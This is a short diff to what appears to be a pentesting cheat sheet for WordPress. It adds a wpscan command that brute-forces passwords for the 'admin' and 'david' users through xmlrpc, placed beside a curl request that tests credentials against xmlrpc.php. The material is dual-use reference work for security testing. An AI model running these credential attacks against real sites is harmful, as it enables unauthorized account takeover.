@@ -1701,6 +1701,7 @@ $ wpscan --url <URL> -e u
 
 ```
 $ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://<URL>/xmlrpc.php
+$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url <URL>
 ```
 
 #25. - Sensitive Data Exposure
